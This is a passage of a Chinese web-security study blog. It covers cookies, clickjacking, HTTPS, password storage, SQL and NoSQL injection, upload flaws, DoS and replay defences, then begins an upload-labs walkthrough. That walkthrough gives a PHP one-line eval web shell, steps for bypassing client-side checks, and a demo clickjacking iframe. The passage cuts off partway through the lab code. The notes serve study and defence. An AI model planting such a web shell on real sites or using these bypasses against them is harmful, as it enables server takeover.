user.id, &#123;</span><br><span class="line">    httpOnly:<span class="literal">false</span>,</span><br><span class="line">    sameSite:<span class="string">&#x27;strict&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200502172441973.png" alt="image-20200502172441973"></p><p>此时我们可以看出来，签名是一个字符串，而id是一个明文</p><ul><li>sessionId：是一个字符串，与用户相关的信息没有任何关系，就是一个包豪斯</li></ul><h2 id="3-cookies与XSS-CSRF的关系与案例"><a href="#3-cookies与XSS-CSRF的关系与案例" class="headerlink" title="3 cookies与XSS CSRF的关系与案例"></a>3 cookies与XSS CSRF的关系与案例</h2><h2 id="4-cookies安全策略"><a href="#4-cookies安全策略" class="headerlink" title="4 cookies安全策略"></a>4 cookies安全策略</h2><ul><li>签名防篡改：其数据仍然是明文给的，但是我可以通过签名来验证我有没有修改过</li><li>私有变换（加密）：不是明文，而是加密的，同时避免信息泄露，因为不知道它是什么含义（密文+秘钥）<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503002538661.png" alt="image-20200503002538661"></li><li>http-only（防止xss）：防止js读取cookie</li><li>secure：只能在https请求中才能读取cookie</li><li>same-site：防止csrf攻击 </li></ul><h1 id="4-前端点击劫持问题"><a href="#4-前端点击劫持问题" class="headerlink" title="4 前端点击劫持问题"></a>4 前端点击劫持问题</h1><h2 id="1-点击劫持演示"><a href="#1-点击劫持演示" class="headerlink" title="1 点击劫持演示"></a>1 点击劫持演示</h2><p><strong>危害</strong>：</p><ul><li>用户亲手操作</li><li>用户不知情</li><li>盗取用户资金 （转账、消费）</li><li>获取用户敏感信息</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">        &lt;title&gt;csrf demo&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body style=<span class="string">&quot;background:url(clickhijack.png) no-repeat&quot;</span>&gt;</span><br><span class="line">        &lt;iframe style=<span class="string">&quot;opacity:0&quot;</span> src=<span class="string">&quot;http://localhost:1521/post/1&quot;</span> width=<span class="string">&quot;800&quot;</span> height=<span class="string">&quot;600&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-点击劫持防御"><a href="#2-点击劫持防御" class="headerlink" title="2 点击劫持防御"></a>2 点击劫持防御</h2><p><code>点击劫持原理：</code>将目标网站做一个iframe嵌入到我们攻击者网站中，将iframe从视觉将其隐藏，即透明度设置为零，但是仍然在目标网站上进行操作<br><code>防御：</code>目标网站不能够被其他网站内嵌  </p><p><strong>方法：</strong></p><ul><li><code>JavaScript禁止内嵌：</code>top是外面的，而window是内嵌的那个iframe，当<code>if(top.location !=window.location)   top.location = window.location</code>,当我们访问clickhack.html时，我们会跳转到iframe中的网站，而不会进入攻击者的网站，从而被点击劫持。即我们利用JavaScript做了一个页面的跳转，但是这能够解决问题吗<strong>？</strong><br>如果攻击者网站禁止 了JavaScript了，就不可以了<br>例如，我们添加一个属性，<code>sandbox=“allow-forms”</code>，这个属性禁止了很多功能包括JavaScript，但是允许表单提交</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body style=<span class="string">&quot;background:url(clickhijack.png) no-repeat&quot;</span>&gt;</span><br><span class="line">    &lt;iframe style=<span class="string">&quot;opacity:0&quot;</span> sandbox=“allow-forms” src=<span class="string">&quot;http://localhost:1521/post/1&quot;</span> width=<span class="string">&quot;800&quot;</span> height=<span class="string">&quot;600&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503100604764.png" alt="image-20200503100604764">此时我们仍然能够点解劫持，我们之前做的JavaScript的功能就失效了</p><ul><li><code>X-FRAME-OPTIONS 禁止内嵌</code>：之前我们是利用header的方法，后续可以改变的，不科学。而是应该一开始就已经决定好其特性，即页面在加载的时候就已经指定好了关于<code>iframe</code>的策略，这个网站是否允许内嵌<br><code>ctx.set(&#39;X-Frame-Option&#39;, &#39;DENY&#39;)</code>:它的值有三种，<br><code>DENY</code>:禁止内嵌<br><code>SAME-ORIGIN:</code>表示嵌入页和被嵌入页处于同一个网站时可以使用<br><code>SAMEORIGIN:</code>同一个域时才可以使用<br><code>ALLOW-FROM:</code>在这后面填上允许的网址</li><li>其他辅助手段（增加用户的操作难度）：验证码</li></ul><h2 id="3-PHP-点击劫持"><a href="#3-PHP-点击劫持" class="headerlink" title="3 PHP-点击劫持"></a>3 PHP-点击劫持</h2><p>使用上面一样的</p><h1 id="5-传输安全"><a href="#5-传输安全" class="headerlink" title="5 传输安全"></a>5 传输安全</h1><h2 id="1-HTTP窃听"><a href="#1-HTTP窃听" class="headerlink" title="1 HTTP窃听"></a>1 HTTP窃听</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503105716835.png" alt="image-20200503105716835"></p><p>traceroute（Linux）可以查看数据经过哪些节点<br>tracert（windows下）</p><ul><li>窃听用户密码</li><li>窃听传输敏感信息</li><li>非法获取个人资料</li></ul><p><strong>HTTP篡改</strong></p><ul><li>插入广告</li><li>重定向网站</li><li>无法预防的xss和csrf攻击</li></ul><h2 id="2-HTTPS原理"><a href="#2-HTTPS原理" class="headerlink" title="2 HTTPS原理"></a>2 HTTPS原理</h2><p>发送：明文变换到密文</p><p>接受：密文变明文</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503114552059.png" alt="image-20200503114552059"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503114752576.png" alt="image-20200503114752576"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503123407681.png" alt="image-20200503123407681"></p><h2 id="3-HTTPS部署"><a href="#3-HTTPS部署" class="headerlink" title="3 HTTPS部署"></a>3 HTTPS部署</h2><h2 id="4-真实服务器申请部署HTTPS"><a href="#4-真实服务器申请部署HTTPS" class="headerlink" title="4 真实服务器申请部署HTTPS"></a>4 真实服务器申请部署HTTPS</h2><h1 id="6-密码安全"><a href="#6-密码安全" class="headerlink" title="6 密码安全"></a>6 密码安全</h1><h2 id="1-密码的作用"><a href="#1-密码的作用" class="headerlink" title="1 密码的作用"></a>1 密码的作用</h2><p>证明你就是你</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503135335326.png" alt="image-20200503135335326"></p><h2 id="2-密码的存储"><a href="#2-密码的存储" class="headerlink" title="2 密码的存储"></a>2 密码的存储</h2><p><strong>密码-泄露渠道</strong></p><ul><li>数据库被偷</li><li>服务器被入侵</li><li>通讯被窃听</li><li>内部人员泄露数据</li><li>其他网站（撞库）：拿着该用户和密码去其他的网站上去尝试</li></ul><p>**密码-存储</p><ul><li>严禁明文存储（防泄露）</li><li>单向变换（防泄露）：无法逆推</li><li>变换复杂度要求（防猜解）</li><li>密码复杂度要求（防猜解）</li><li>加盐（防猜解）</li></ul><p><strong>密码-哈希算法（信息摘要算法）</strong></p><ul><li>明文-密文一一对应</li><li>雪崩效应</li><li>密文-明文  无法反推</li><li>密文固定长度</li><li>常见哈希算法：md5、sha1 、sha256</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503140546312.png" alt="image-20200503140546312"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503140653758.png" alt="image-20200503140653758"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503140849995.png" alt="image-20200503140849995"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503141035016.png" alt="image-20200503141035016"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503141140736.png" alt="image-20200503141140736"></p><h2 id="3-密码不安全的案例"><a href="#3-密码不安全的案例" class="headerlink" title="3 密码不安全的案例"></a>3 密码不安全的案例</h2><h2 id="4-密码加固"><a href="#4-密码加固" class="headerlink" title="4 密码加固"></a>4 密码加固</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503145256145.png" alt="image-20200503145256145"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503145532661.png" alt="image-20200503145532661"></p><h2 id="5-密码传输安全"><a href="#5-密码传输安全" class="headerlink" title="5 密码传输安全"></a>5 密码传输安全</h2><p>切记不要密码明文传输</p><p><strong>密码传输的安全性</strong></p><ul><li>https传输</li><li>频率限制</li><li>前端加密意义有限：明文密码不会泄露，但是攻击者仍然可以登录，因为攻击者也可以拿这个加密后的密码去登录</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503153243548.png" alt="image-20200503153243548">同时后台也是需要修改的，因为之前后台接收到的是明文，做的也是明文的处理。而现在是密文传输过来的，所以后端的代码需要修改</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503153621341.png" alt="image-20200503153621341"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503153813962.png" alt="image-20200503153813962"></p><h2 id="6-生物密码"><a href="#6-生物密码" class="headerlink" title="6 生物密码"></a>6 生物密码</h2><ul><li>指纹（唇纹）</li><li>声纹</li><li>虹膜</li><li>人脸</li></ul><p><strong>问题：</strong></p><ul><li>私密性——容易泄露</li><li>安全性（基于相似性，概率做的而不是类似于哈希中一一对应的）——碰撞</li><li>唯一性——终身唯一，无法修改</li></ul><h2 id="7-PHP-密码加固"><a href="#7-PHP-密码加固" class="headerlink" title="7 PHP-密码加固"></a>7 PHP-密码加固</h2><h1 id="7-接入层注入问题"><a href="#7-接入层注入问题" class="headerlink" title="7 接入层注入问题"></a>7 接入层注入问题</h1><h2 id="1-关系型数据库和SQL介绍"><a href="#1-关系型数据库和SQL介绍" class="headerlink" title="1 关系型数据库和SQL介绍"></a>1 关系型数据库和SQL介绍</h2><ul><li><p>存放结构化数据</p></li><li><p>可高效操作大量数据</p></li><li><p>方便处理数据之间的关联关系</p><p>SQL语言：类似自然语言的描述性语言</p></li></ul><h2 id="2-SQL注入前置知识"><a href="#2-SQL注入前置知识" class="headerlink" title="2 SQL注入前置知识"></a>2 SQL注入前置知识</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503172913207.png" alt="image-20200503172913207"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503174004645.png" alt="image-20200503174004645"></p><p><strong>解释如下：</strong></p><p>1：会产生错误，帮助我们进行下一步<br>2: 前置条件失效<br>3：mid（version(),1,1）函数有三个参数，version()返回版本号，然后从第一位开始截取一位，即5；可用于数据库信息的探测<br>4：没指定列的名字，而是1,2,3，可以列出有多少个字段<br>5：类似上面的<br>6：union表示联合，把后面的语句结果附加到前面语句的结果上面<br>7：把username的第一位拿出来，等于t的数据查询出来，类似于3,做一个信息探测</p><p><strong>演示如下</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503173727028.png" alt="image-20200503173727028"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503173747707.png" alt="image-20200503173747707"></p><h2 id="3-SQL注入演示和危害"><a href="#3-SQL注入演示和危害" class="headerlink" title="3  SQL注入演示和危害"></a>3  SQL注入演示和危害</h2><p><strong>危害：</strong></p><ul><li>猜解密码</li><li>获取数据</li><li>删库删表</li><li>拖库</li></ul><h2 id="4-SQL注入案例"><a href="#4-SQL注入案例" class="headerlink" title="4 SQL注入案例"></a>4 SQL注入案例</h2><h2 id="5-SQL注入防御上"><a href="#5-SQL注入防御上" class="headerlink" title="5 SQL注入防御上"></a>5 SQL注入防御上</h2><ul><li><p>关闭错误输出<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503180307298.png" alt="image-20200503180307298"></p></li><li><p>检查数据类型</p></li><li><p>对数据进行转义：将可能变为程序的字符进行转义<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503180722497.png" alt="image-20200503180722497"></p><p>或者参数化查询<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503180807173.png" alt="image-20200503180807173" style="zoom:25%;"></p></li><li><p>使用参数化查询：作为一个占位符</p></li><li><p>使用ORM（对象关系映射）<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200503185310376.png" alt="image-20200503185310376"></p></li></ul><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="6-NoSQL注入和防御"><a href="#6-NoSQL注入和防御" class="headerlink" title="6 NoSQL注入和防御"></a>6 NoSQL注入和防御</h2><ul><li>检查数据类型</li><li>类型转换</li><li>写完整条件</li></ul><h2 id="7-PHP-SQL注入"><a href="#7-PHP-SQL注入" class="headerlink" title="7 PHP-SQL注入"></a>7 PHP-SQL注入</h2><ul><li>检查数据类型</li><li>对数据进行转义</li><li>使用参数化查询</li><li>使用ORM</li></ul><h1 id="8-接入层上传问题"><a href="#8-接入层上传问题" class="headerlink" title="8 接入层上传问题"></a>8 接入层上传问题</h1><h2 id="1-上传漏洞简介"><a href="#1-上传漏洞简介" class="headerlink" title="1 上传漏洞简介"></a>1 上传漏洞简介</h2><ul><li>上传文件：由用户提供，无法预知用户上传的是什么内容</li><li>再次访问上传</li><li>上传的文件被当成程序解析</li></ul><h2 id="2-上传漏洞演示"><a href="#2-上传漏洞演示" class="headerlink" title="2 上传漏洞演示"></a>2 上传漏洞演示</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504091838051.png" alt="image-20200504091838051"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504092107292.png" alt="image-20200504092107292"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504092725775.png" alt="image-20200504092725775"></p><h2 id="3-上传漏洞案例"><a href="#3-上传漏洞案例" class="headerlink" title="3 上传漏洞案例"></a>3 上传漏洞案例</h2><h2 id="4-上传漏洞防御"><a href="#4-上传漏洞防御" class="headerlink" title="4 上传漏洞防御"></a>4 上传漏洞防御</h2><ul><li>限制上传后缀</li><li>文件类型检查</li><li>文件内容检查</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504094647393.png" alt="image-20200504094647393"></p><ul><li>程序输出</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504094738532.png" alt="image-20200504094738532"></p><ul><li>权限控制-可写可执行互斥</li></ul><h2 id="5-PHP-文件上传"><a href="#5-PHP-文件上传" class="headerlink" title="5 PHP-文件上传"></a>5 PHP-文件上传</h2><p>防御跟上述的一样</p><ul><li><p>1：<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504100008505.png" alt="image-20200504100008505"></p></li><li><p>2：<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504100204121.png" alt="image-20200504100204121"></p></li><li><p>3：<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504100330627.png" alt="image-20200504100330627"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504100357030.png" alt="image-20200504100357030"></p></li><li><p>4：<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504100648104.png" alt="image-20200504100648104"></p></li></ul><h1 id="9-社会工程学和信息泄露"><a href="#9-社会工程学和信息泄露" class="headerlink" title="9 社会工程学和信息泄露"></a>9 社会工程学和信息泄露</h1><h2 id="1-信息泄露和社会工程学"><a href="#1-信息泄露和社会工程学" class="headerlink" title="1 信息泄露和社会工程学"></a>1 信息泄露和社会工程学</h2><p><strong>信息泄露</strong></p><ul><li>泄露系统敏感信息</li><li>泄露用户敏感信息</li><li>泄露用户密码</li></ul><p><strong>信息泄露途径</strong></p><ul><li>错误信息失控</li><li>SQL注入</li><li>水平权限控制不当</li><li>XSS/CSRF</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504104750027.png" alt="image-20200504104750027"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504110526536.png" alt="image-20200504110526536"></p><h2 id="2-社会工程学案例"><a href="#2-社会工程学案例" class="headerlink" title="2 社会工程学案例"></a>2 社会工程学案例</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504111012630.png" alt="image-20200504111012630"></p><h2 id="3-OAuth思想介绍"><a href="#3-OAuth思想介绍" class="headerlink" title="3 OAuth思想介绍"></a>3 OAuth思想介绍</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504111229014.png" alt="image-20200504111229014"></p><ul><li>一切行为由用户授权</li><li>授权行为不泄露敏感信息</li><li>授权会过期</li></ul><h2 id="4-利用OAuth思想保护用户资料"><a href="#4-利用OAuth思想保护用户资料" class="headerlink" title="4 利用OAuth思想保护用户资料"></a>4 利用OAuth思想保护用户资料</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504112408517.png" alt="image-20200504112408517"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504115136167.png" alt="image-20200504115136167"></p><h1 id="10-其他安全问题"><a href="#10-其他安全问题" class="headerlink" title="10 其他安全问题"></a>10 其他安全问题</h1><h2 id="1-DOS（拒绝服务）攻击"><a href="#1-DOS（拒绝服务）攻击" class="headerlink" title="1 DOS（拒绝服务）攻击"></a>1 DOS（拒绝服务）攻击</h2><ul><li>模拟正常用户</li><li>大量占用服务器资源</li><li>无法服务正常用户</li></ul><p><strong>类型：</strong></p><ul><li>TCP半连接</li><li>HTTP连接</li><li>DNS</li></ul><p><strong>大规模分布式拒绝服务供给DDOS</strong></p><ul><li>流量可达几十到上百G</li><li>分布式（肉鸡、代理）</li><li>极难防御</li><li></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200504120038860.png" alt="image-20200504120038860"></p><p><strong>防御：</strong> </p><ul><li>防火墙</li><li>交换机、路由器</li><li>流量清洗</li><li>高防IP</li></ul><p><strong>预防</strong></p><ul><li>避免重逻辑业务</li><li>快速失败快速返回</li><li>防雪崩机制</li><li>有损服务</li><li>CDN：静态文件不放在服务器上面，而是访问CDN</li></ul><h2 id="2-重放攻击"><a href="#2-重放攻击" class="headerlink" title="2 重放攻击"></a>2 重放攻击</h2><ul><li>请求被窃听或记录</li><li>再次发起相同的请求</li><li>产生意外的结果：用户被多次消费；用户登录态被盗取；多次抽奖</li></ul><p><strong>防御</strong></p><ul><li>加密（HTTPS）：防止被窃听</li><li>时间戳：超过时间的请求失效</li><li>token（session）：</li><li>nonce（一次性数据）：<br>注意：时间戳和nonce 都要防止被篡改，于是需要签名</li><li>签名：</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="不安全的文件上传漏洞概述"><a href="#不安全的文件上传漏洞概述" class="headerlink" title="不安全的文件上传漏洞概述"></a>不安全的文件上传漏洞概述</h1><a id="more"></a><p>文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。</p><p>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：</p><ul><li>–验证文件类型、后缀名、大小; </li><li>–验证文件的上传方式;</li><li>–对文件进行一定复杂的重命名;</li><li>–不要暴露文件上传后的路径;</li><li>–等等…</li></ul><p><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/mind-map.png" alt="mind-map"></p><p><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/sum_up.png" alt="sum_up"></p><p><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200527123305833.png" alt="image-20200527123305833"></p><p>参考</p><p><code>https://fuping.site/2018/06/04/upload-labs-writeup/</code></p><p><code>https://dylan903.github.io/2019/08/04/upload-labs-wen-jian-shang-chuan-lou-dong-lian-xi/</code></p><p><code>https://zhuanlan.zhihu.com/p/52099683</code></p><p><code>https://www.shangmayuan.com/a/580f4475223e407d8de8a752.html</code></p><p><code>https://zhuanlan.zhihu.com/p/74555530</code></p><h2 id="Pass-01（前端绕过-改包）"><a href="#Pass-01（前端绕过-改包）" class="headerlink" title="Pass-01（前端绕过+改包）"></a>Pass-01（前端绕过+改包）</h2><p>这一关是在客户端使用js对不合法图片进行检查，直接F12，把调用相关js的代码删掉，直接上传拿shell。</p><p>在chrome浏览器中有一个<code>noScript</code>插件可以快速帮助你禁止掉js</p><h3 id="1-修改JS脚本"><a href="#1-修改JS脚本" class="headerlink" title="1.修改JS脚本"></a>1.修改JS脚本</h3><p>网上的方法是通过修改<code>js</code>的<code>allow_txt</code>的内容或者删掉<code>onsubmit=&quot;return checkFile()</code>禁止触发js函数</p><p><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200527000658956.png" alt="image-20200527000658956"></p><p><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200527001751536.png" alt="image-20200527001751536"></p><p>或者</p><h3 id="3-burp抓包改包"><a href="#3-burp抓包改包" class="headerlink" title="3.burp抓包改包"></a>3.burp抓包改包</h3><p>因为客户端会在js中判断文件，所以直接上传拦截后修改为php文件</p><p> <strong>一句话木马</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;wlk&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-禁止浏览器运行JS"><a href="#3-禁止浏览器运行JS" class="headerlink" title="3.禁止浏览器运行JS"></a>3.禁止浏览器运行JS</h3><p>js前端检测的源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;li id=<span class="string">&quot;show_code&quot;</span>&gt;</span><br><span class="line">    &lt;h3&gt;代码&lt;/h3&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;code <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;line-numbers language-javascript&quot;</span>&gt;<span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/code&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure><p><code>if (file == null || file == &quot;&quot;)</code>这段引来了一个思考，两个都是表示0为什么还有重复去判断呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">null</span>：代表声明了一个空对象，不是一个字符串，可以赋给任何对象，是没有地址。</span><br><span class="line"><span class="string">&quot;&quot;</span>：代表声明了一个对象实例，这个对象实例的值是一个长度为<span class="number">0</span>的空字符串，是有地址但是里面的内容是空的。</span><br></pre></td></tr></table></figure><p>下面的判断文件上传的函数</p><p><strong>index.php文件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<span class="comment">//判断UPLOAD_PATH上传目录是否存在</span></span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span 